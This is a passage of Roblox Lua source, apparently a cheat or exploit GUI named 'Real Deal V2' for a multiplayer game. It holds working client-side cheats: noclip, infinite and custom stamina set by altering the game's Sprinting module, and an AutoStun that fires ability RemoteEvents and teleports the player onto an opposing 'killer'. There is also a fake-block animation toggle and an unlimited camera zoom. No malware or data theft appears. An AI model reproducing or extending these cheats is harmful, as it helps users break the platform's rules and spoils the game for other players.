		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
		if button:GetAttribute("toggle") == true then
		
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("TpUI"):WaitForChild("MainFrame").Visible = true
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("TpUI"):WaitForChild("TextButton").Visible = true
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("TpUI"):WaitForChild("TPUI").Visible = true
	
		
		elseif button:GetAttribute("toggle") == false then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("TpUI"):WaitForChild("MainFrame").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("TpUI"):WaitForChild("TextButton").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("TpUI"):WaitForChild("TPUI").Visible = false
			end
	end)
end;
task.spawn(C_9c);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.HAKARI(Best Emote BTW).ImageButton.LocalScript
local function C_a0()
local script = G2L["a0"];
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local ismobile = UIS.TouchEnabled
	local isdesktop = UIS.KeyboardEnabled or UIS.MouseEnabled
	local iscontroller = UIS.GamepadEnabled
	
	local PCorMobile = if ismobile then "Mobile" elseif isdesktop then "PC" elseif iscontroller then "Controller" else "Unknown"
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	-- store the active keybind connection globally
	local GoofyAhhConnection = nil
	_G.executed = false
	local respawnConnection = nil
	
	local function playAnim(character)
		local humanoid = character:WaitForChild("Humanoid")
		local animator = humanoid:FindFirstChildOfClass("Animator")
		if not animator then
			animator = Instance.new("Animator")
			animator.Parent = humanoid
		end
	
		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://138019937280193"
		local track = animator:LoadAnimation(animation)
		return track
	end
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		if newState and PCorMobile == "PC" then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI").Visible = true
		elseif newState and PCorMobile == "Mobile" then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("HAKARIBUTTON").Visible = true
		else
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("HAKARIBUTTON").Visible = false
		end
	
		if not newState then
			if GoofyAhhConnection then
				GoofyAhhConnection:Disconnect()
				GoofyAhhConnection = nil
			end
			if respawnConnection then
				respawnConnection:Disconnect()
				respawnConnection = nil
			end
		end
	
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("Confirm"):WaitForChild("Yes").MouseButton1Down:Connect(function()
			local keybindValue = script.Parent.Parent.Parent.Parent.Parent.Parent
				:WaitForChild("KeybindThingyForHAKARI")
				:WaitForChild("TextBox")
				:GetAttribute("value")
			local keybind = Enum.KeyCode[keybindValue]
	
			if GoofyAhhConnection then
				GoofyAhhConnection:Disconnect()
				GoofyAhhConnection = nil
			end
			if respawnConnection then
				respawnConnection:Disconnect()
				respawnConnection = nil
			end
	
			GoofyAhhConnection = UIS.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if input.KeyCode == keybind then
					local character = player.Character
					if not character then return end
	
					if not _G.executed then
						_G.executed = true
						local track = playAnim(character)
						if track then track:Play() end
	
						-- Only reconnect this once
						respawnConnection = player.CharacterAdded:Connect(function(char)
							-- only play if still toggled ON and executed true
							if button:GetAttribute("toggle") and _G.executed then
								local newTrack = playAnim(char)
								if newTrack then newTrack:Play() end
							end
						end)
					else
						_G.executed = false
						for _, anim in pairs(character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
							if anim.Animation.AnimationId == "rbxassetid://138019937280193" then
								anim:Stop()
							end
						end
					end
				end
			end)
	
			if not button:GetAttribute("toggle") then
				script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI").Visible = false
				script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("HAKARIBUTTON").Visible = false
				if GoofyAhhConnection then
					GoofyAhhConnection:Disconnect()
					GoofyAhhConnection = nil
				end
				if respawnConnection then
					respawnConnection:Disconnect()
					respawnConnection = nil
				end
			end
		end)
	end)
	
	-- Exit cleanup
	local suc,res = pcall(function()
	script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton").MouseButton1Down:Connect(function()
		local character = player.Character
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI").Visible = false
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("HAKARIBUTTON").Visible = false
	
		if GoofyAhhConnection then
			GoofyAhhConnection:Disconnect()
			GoofyAhhConnection = nil
		end
		if respawnConnection then
			respawnConnection:Disconnect()
			respawnConnection = nil
		end
	
		for _, anim in pairs(character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
			if anim.Animation.AnimationId == "rbxassetid://138019937280193" then
				anim:Stop()
			end
		end
	end)
	end)
	if suc then
	else
		warn("failed")
	end
end;
task.spawn(C_a0);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Noclip.ImageButton.LocalScript
local function C_a4()
local script = G2L["a4"];
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local LocalPlr = Players.LocalPlayer
	_G.currentlyrunning = false
	
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local exitButton = script.Parent.Parent.Parent:WaitForChild("Exit"):WaitForChild("ImageButton")
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	-- === Noclip setup ===
	local NoclipConnection = nil
	local Clip = true
	
	local function enableNoclip()
		Clip = false
		NoclipConnection = RunService.Stepped:Connect(function()
			if not Clip and LocalPlr.Character then
				for _, v in pairs(LocalPlr.Character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.CanCollide = false
					end
				end
			end
			task.wait(0.21)
		end)
	end
	
	local function disableNoclip()
		Clip = true
		if NoclipConnection then
			NoclipConnection:Disconnect()
			NoclipConnection = nil
		end
	end
	
	-- === Button logic ===
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		_G.currentlyrunning = newState
	
		task.spawn(function()
			if newState then
				enableNoclip()
			else
				disableNoclip()
			end
		end)
	end)
	
end;
task.spawn(C_a4);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.FpsCounter.ImageButton.LocalScript
local function C_a8()
local script = G2L["a8"];
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local LocalPlr = Players.LocalPlayer
	
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local exitButton = script.Parent.Parent.Parent:WaitForChild("Exit"):WaitForChild("ImageButton")
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
		
		if script.Parent.Parent:WaitForChild("ImageButton"):GetAttribute("toggle") then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):WaitForChild("CanvasGroup").Visible = true
		elseif script.Parent.Parent:WaitForChild("ImageButton"):GetAttribute("toggle") == false  then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):WaitForChild("CanvasGroup").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):WaitForChild("R").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):WaitForChild("G").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):WaitForChild("B").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):WaitForChild("TextBox").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FPSCounter"):WaitForChild("TextButton").Visible = false
		end
		
	end)
	
end;
task.spawn(C_a8);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Satisfying Click.ImageButton.LocalScript
local function C_ac()
local script = G2L["ac"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	--Dumber GPT btw
	
	-- Set initial toggle state and image
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735" -- OFF image
	
	button.MouseButton1Click:Connect(function()
		-- Toggle the state
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
	
		-- Update image
		if newState then
			button.Image = "http://www.roblox.com/asset/?id=75082622496228" -- ON image
		else
			button.Image = "http://www.roblox.com/asset/?id=76864339841735" -- OFF image
		end
	
		-- Play click sound
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://88442833509532"
		sound.Volume = 1
		sound.Parent = workspace
		sound:Play()
		game.Debris:AddItem(sound, 2)
	end)
	
end;
task.spawn(C_ac);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.No Camera Zoom Limit.ImageButton.LocalScript
local function C_b0()
local script = G2L["b0"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	
	button:SetAttribute("toggle", "off")
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	local atr = button:GetAttribute("toggle")
	
	button.MouseButton1Click:Connect(function()
		atr = button:GetAttribute("toggle")
		if atr == "off" then
			button:SetAttribute("toggle", "middle")
			button.Image = "http://www.roblox.com/asset/?id=72245693120492"
		elseif atr == "middle" then
			button:SetAttribute("toggle", "on")
			button.Image = "http://www.roblox.com/asset/?id=75082622496228"
		elseif atr == "on" then
			button:SetAttribute("toggle", "off")
			button.Image = "http://www.roblox.com/asset/?id=76864339841735"
		end
	
		if button:GetAttribute("toggle") == "on" then
			
			game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
			
		elseif button:GetAttribute("toggle") == "middle" then
			
			game.Players.LocalPlayer.CameraMaxZoomDistance = 128
			
		elseif button:GetAttribute("toggle") == "off" then
	
			game.Players.LocalPlayer.CameraMaxZoomDistance = 12
	
		end
	end)
end;
task.spawn(C_b0);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Fun.Exit.ImageButton.LocalScript
local function C_b4()
local script = G2L["b4"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	button.MouseButton1Click:Connect(function()
		local suc,res = pcall(function()
			button.Parent.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("Real Deal V2"):Destroy()
			_G.BugsakenHacksRunning = false
		end)
		if suc then
		else
			button.Parent.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("Real Deal V2"):Destroy()
			_G.BugsakenHacksRunning = false
		end
	end)
	
end;
task.spawn(C_b4);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MinStamina.TextButton.LocalScript
local function C_b9()
local script = G2L["b9"];
	local text = nil
	local SprintModule = require(game:GetService("ReplicatedStorage").Systems.Character.Game.Sprinting)
	
	script.Parent.MouseButton1Down:Connect(function()
		text = script.Parent.Parent:WaitForChild("TextBox").Text
		local num = tonumber(text)
		if num then
			SprintModule.MinStamina = num
			script.Parent.Parent.Parent:WaitForChild("MinStamina").Text = "Successfully Set Min Stamina To " .. num
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("MinStamina").Text = "Set Min Stamina"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 0"
		else
			script.Parent.Parent.Parent:WaitForChild("MinStamina").Text = "Not A Number"
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("MinStamina").Text = "Set Min Stamina"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 0"
		end
		
	end)
end;
task.spawn(C_b9);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaGain.TextButton.LocalScript
local function C_c1()
local script = G2L["c1"];
	local text = nil
	local SprintModule = require(game:GetService("ReplicatedStorage").Systems.Character.Game.Sprinting)
	
	script.Parent.MouseButton1Down:Connect(function()
		text = script.Parent.Parent:WaitForChild("TextBox").Text
		local num = tonumber(text)
		if num then
			SprintModule.StaminaGain = num
			script.Parent.Parent.Parent:WaitForChild("StaminaGain").Text = "Successfully Set Stamina Gain To " .. num
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("StaminaGain").Text = "Set Stamina gain"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 20"
		else
			script.Parent.Parent.Parent:WaitForChild("StaminaGain").Text = "Not A Number"
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("StaminaGain").Text = "Set Stamina gain"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 20"
		end
		
	end)
end;
task.spawn(C_c1);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.StaminaLoss.TextButton.LocalScript
local function C_c9()
local script = G2L["c9"];
	local text = nil
	local SprintModule = require(game:GetService("ReplicatedStorage").Systems.Character.Game.Sprinting)
	
	script.Parent.MouseButton1Down:Connect(function()
		text = script.Parent.Parent:WaitForChild("TextBox").Text
		local num = tonumber(text)
		if num then
			SprintModule.StaminaLoss = num
			script.Parent.Parent.Parent:WaitForChild("StaminaLoss").Text = "Successfully Set Stamina Loss To " .. num
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("StaminaLoss").Text = "Set Stamina loss"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 10"
		else
			script.Parent.Parent.Parent:WaitForChild("StaminaLoss").Text = "Not A Number"
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("StaminaLoss").Text = "Set Stamina loss"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 10"
		end
		
	end)
end;
task.spawn(C_c9);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.MaxStamina.TextButton.LocalScript
local function C_d1()
local script = G2L["d1"];
	local text = nil
	local SprintModule = require(game:GetService("ReplicatedStorage").Systems.Character.Game.Sprinting)
	
	script.Parent.MouseButton1Down:Connect(function()
		text = script.Parent.Parent:WaitForChild("TextBox").Text
		local num = tonumber(text)
		if num then
			SprintModule.MaxStamina = num
			script.Parent.Parent.Parent:WaitForChild("MaxStamina").Text = "Successfully Set Max Stamina To " .. num
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("MaxStamina").Text = "Set Max Stamina"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 100"
		else
			script.Parent.Parent.Parent:WaitForChild("MaxStamina").Text = "Not A Number"
			task.wait(0.75)
			script.Parent.Parent.Parent:WaitForChild("MaxStamina").Text = "Set Max Stamina"
			script.Parent.Parent:WaitForChild("TextBox").Text = "Default 100"
		end
		
	end)
end;
task.spawn(C_d1);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Stamina.Inf Stamina.ImageButton.LocalScript
local function C_d9()
local script = G2L["d9"];
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local TheHell = false
	
	local SprintModule = require(game:GetService("ReplicatedStorage").Systems.Character.Game.Sprinting)
	
	local LocalPlr = Players.LocalPlayer
	
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local exitButton = script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton")
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		if TheHell == false then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("Warning").Visible = true
		end
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		while button:GetAttribute("toggle") do
			task.wait(0.5)
			SprintModule.StaminaLoss = 0
		end
		while button:GetAttribute("toggle") == false do
			task.wait(0.5)
			SprintModule.StaminaLoss = 10
		end
	end)
	
	script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("Warning"):WaitForChild("TextLabel"):WaitForChild("TextButton").MouseButton1Down:Connect(function()
		TheHell = true
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("Warning"):Destroy()
	end)
	
end;
task.spawn(C_d9);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.AutoStun.ImageButton.LocalScript
local function C_de()
local script = G2L["de"];
	local UIS = game:GetService("UserInputService")
	
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local ismobile = UIS.TouchEnabled
	local isdesktop = UIS.KeyboardEnabled or UIS.MouseEnabled
	local iscontroller = UIS.GamepadEnabled
	
	local PCorMobile = if ismobile then "Mobile" elseif isdesktop then "PC" elseif iscontroller then "Controller" else "Unknown"
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	-- store the active keybind connection globally
	local GoofyAhhConnection = nil
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		if newState and PCorMobile == "PC" then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy").Visible = true
		end
		if newState and PCorMobile == "Mobile" then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("StunBtn").Visible = true
		end
		
		if button:GetAttribute("toggle") == false then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("StunBtn").Visible = false
		end
	
		-- disconnect any previous connections so they don't stack
		if GoofyAhhConnection then
			GoofyAhhConnection:Disconnect()
			GoofyAhhConnection = nil
		end
	
		-- connect confirm button
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("Confirm"):WaitForChild("Yes").MouseButton1Down:Connect(function()
			local keybindValue = script.Parent.Parent.Parent.Parent.Parent.Parent
				:WaitForChild("KeybindThingy")
				:WaitForChild("TextBox")
				:GetAttribute("value")
			local keybind = Enum.KeyCode[keybindValue]
	
			-- disconnect old connection if one exists
			if GoofyAhhConnection then
				GoofyAhhConnection:Disconnect()
				GoofyAhhConnection = nil
			end
	
			-- set new one
			GoofyAhhConnection = UIS.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if input.KeyCode == keybind then
					local a = workspace:WaitForChild("Players"):WaitForChild("Killers"):GetChildren()
					local name = nil
					local player = game.Players.LocalPlayer
	
					local charector = player.Character or player.CharacterAdded:Wait()
					local hrp = charector:WaitForChild("HumanoidRootPart")
					local part = Instance.new("Part")
	
					_G.m = 0
	
					task.spawn(function()
						while _G.m < 10 do
							_G.m = _G.m+1
							workspace:WaitForChild("BTCH"):Destroy()
						end
					end)
	
					local pos = hrp.Position
					local FOLDER = Instance.new("Folder")
					FOLDER.Name = "BTCH"
					FOLDER.Parent = workspace
	
					local xPos = hrp.Position.X
					local yPos = hrp.Position.Y
					local zPos = hrp.Position.Z
	
					local xDir = hrp.Rotation.X
					local yDir = hrp.Rotation.Y
					local zDir = hrp.Rotation.Z
	
	
					part.Position = Vector3.new(xPos,yPos,zPos)
					part.Rotation = Vector3.new(xDir,yDir,zDir)
					part.Anchored = true
					part.Parent = workspace.BTCH
					part.CanCollide = false
					part.Transparency = 1
	
					for i, v in ipairs(a) do
						name = v.name
					end
	
					if name ~= nil then
	
						game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Slash"})
						game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Punch"})
						game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Shoot"})
						task.wait(0.4)
						_G.you = 0
						task.spawn(function()
							task.wait(0.00003)
							game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Dagger"})
						end)
						while _G.you < 10 do
							_G.you = _G.you+1
							task.wait(0.01)
							hrp.CFrame = workspace:WaitForChild("Players"):WaitForChild("Killers"):WaitForChild(name):WaitForChild("HumanoidRootPart").CFrame
						end
					end
					task.wait(0.65)
	
					hrp.CFrame = part.CFrame
					FOLDER:Destroy()
				end
			end)
	
			-- handle toggle off and disconnect properly
			if button:GetAttribute("toggle") == false then
				script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy").Visible = false
				script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("StunBtn").Visible = false
				if GoofyAhhConnection then
					GoofyAhhConnection:Disconnect()
					GoofyAhhConnection = nil
				end
			end
		end)
	end)
	script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton").MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy").Visible = false
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("StunBtn").Visible = false
		if GoofyAhhConnection then
			GoofyAhhConnection:Disconnect()
			GoofyAhhConnection = nil
		end
	end)
	
end;
task.spawn(C_de);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Fake Block.ImageButton.LocalScript
local function C_e2()
local script = G2L["e2"];
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local animationid = script.Parent.Parent:GetAttribute("Animation")
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local ismobile = UIS.TouchEnabled
	local isdesktop = UIS.KeyboardEnabled or UIS.MouseEnabled
	local iscontroller = UIS.GamepadEnabled
	
	local PCorMobile = if ismobile then "Mobile" elseif isdesktop then "PC" elseif iscontroller then "Controller" else "Unknown"
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	-- global so it persists
	local GoofyAhhConnection = nil
	_G.executed = false
	
	-- simple reusable play animation function
	local function playAnim(character)
		if not character then return end
		local humanoid = character:WaitForChild("Humanoid")
		local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
		local animation = Instance.new("Animation")
		animation.AnimationId = animationid
		local track = animator:LoadAnimation(animation)
		return track
	end
	
	-- ensures that keybind reconnects after respawn
	local function reconnectAfterRespawn(keybind)
		player.CharacterAdded:Connect(function(char)
			if GoofyAhhConnection then
				GoofyAhhConnection:Disconnect()
				GoofyAhhConnection = nil
			end
			GoofyAhhConnection = UIS.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if input.KeyCode == keybind then
					local track = playAnim(char)
					if track then track:Play() end
				end
			end)
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		animationid = script.Parent.Parent:GetAttribute("Animation")
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228" or "http://www.roblox.com/asset/?id=76864339841735"
	
		if newState and PCorMobile == "PC" then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK").Visible = true
		elseif newState and PCorMobile == "Mobile" then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FakeBlockBTN").Visible = true
		end
	
		if not newState then
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK").Visible = false
			script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FakeBlockBTN").Visible = false
			if GoofyAhhConnection then
				GoofyAhhConnection:Disconnect()
				GoofyAhhConnection = nil
			end
		end
	
		-- Confirm keybind setup
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("Confirm"):WaitForChild("Yes").MouseButton1Down:Connect(function()
			local keybindValue = script.Parent.Parent.Parent.Parent.Parent.Parent
				:WaitForChild("KeybindThingyForFAKEBLOCK")
				:WaitForChild("TextBox")
				:GetAttribute("value")
			local keybind = Enum.KeyCode[keybindValue]
	
			if GoofyAhhConnection then
				GoofyAhhConnection:Disconnect()
				GoofyAhhConnection = nil
			end
	
			-- create new input connection
			GoofyAhhConnection = UIS.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if input.KeyCode == keybind then
					animationid = script.Parent.Parent:GetAttribute("Animation")
					local track = playAnim(player.Character)
					if track then track:Play() end
				end
			end)
	
			-- reapply when respawning
			reconnectAfterRespawn(keybind)
		end)
	end)
	
	-- Exit button cleanup
	local suc,res = pcall(function()
	script.Parent.Parent.Parent.Parent:WaitForChild("Fun"):WaitForChild("Exit"):WaitForChild("ImageButton").MouseButton1Down:Connect(function()
		local char = player.Character
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK").Visible = false
		script.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("FakeBlockBTN").Visible = false
	
		if GoofyAhhConnection then
			GoofyAhhConnection:Disconnect()
			GoofyAhhConnection = nil
		end
	
		local track = playAnim(char)
		if track and _G.executed then track:Play() end
	
		-- stop existing animation
		for _, anim in pairs(char:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
			if anim.Animation.AnimationId == animationid then
				anim:Stop()
			end
		end
	end)
	end)
	if suc then
	else
		warn("failed")
	end
	
end;
task.spawn(C_e2);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.Block Guest.LocalScript
local function C_e6()
local script = G2L["e6"];
	script.Parent.MouseButton1Down:Connect(function()
		for i,v in pairs(script.Parent.Parent:GetChildren()) do
			if v:IsA("ImageButton") then
				v:SetAttribute("Checked", false)
				v.Image = "rbxassetid://72082883979213"
			end
			script.Parent:SetAttribute("Checked", true)
			script.Parent.Image = "rbxassetid://134295878119246"
			script.Parent.Parent.Parent:WaitForChild("Fake Block"):SetAttribute("Animation","rbxassetid://95802026624883")
		end
	end)
end;
task.spawn(C_e6);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M2-.LocalScript
local function C_eb()
local script = G2L["eb"];
	script.Parent.MouseButton1Down:Connect(function()
		for i,v in pairs(script.Parent.Parent:GetChildren()) do
			if v:IsA("ImageButton") then
				v:SetAttribute("Checked", false)
				v.Image = "rbxassetid://72082883979213"
			end
			script.Parent:SetAttribute("Checked", true)
			script.Parent.Image = "rbxassetid://134295878119246"
			script.Parent.Parent.Parent:WaitForChild("Fake Block"):SetAttribute("Animation","rbxassetid://72722244508749")
		end
	end)
end;
task.spawn(C_eb);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.FakeBlockSelector.M3+.LocalScript
local function C_f0()
local script = G2L["f0"];
	script.Parent.MouseButton1Down:Connect(function()
		for i,v in pairs(script.Parent.Parent:GetChildren()) do
			if v:IsA("ImageButton") then
				v:SetAttribute("Checked", false)
				v.Image = "rbxassetid://72082883979213"
			end
			script.Parent:SetAttribute("Checked", true)
			script.Parent.Image = "rbxassetid://134295878119246"
			script.Parent.Parent.Parent:WaitForChild("Fake Block"):SetAttribute("Animation","rbxassetid://96959123077498")
		end
	end)
end;
task.spawn(C_f0);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Rejoin.ImageButton.LocalScript
local function C_f6()
local script = G2L["f6"];
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	local TeleportService = game:GetService("TeleportService")
	local PlaceId = game.PlaceId
	local JobId = game.JobId
	local Players = game.Players
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228"
			or "http://www.roblox.com/asset/?id=76864339841735"
	
		if #Players:GetPlayers() <= 1 then
			Players.LocalPlayer:Kick("\nRejoining...")
			wait()
			TeleportService:Teleport(PlaceId, Players.LocalPlayer)
		else
			TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
		end
	end)
	
end;
task.spawn(C_f6);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Obi mode.LocalScript
local function C_fa()
local script = G2L["fa"];
	script.Parent.MouseButton1Down:Connect(function()
		for i,v in pairs(script.Parent.Parent:GetChildren()) do
			if v:IsA("ImageButton") then
				v:SetAttribute("Checked", false)
				v.Image = "rbxassetid://72082883979213"
			end
			script.Parent:SetAttribute("Checked", true)
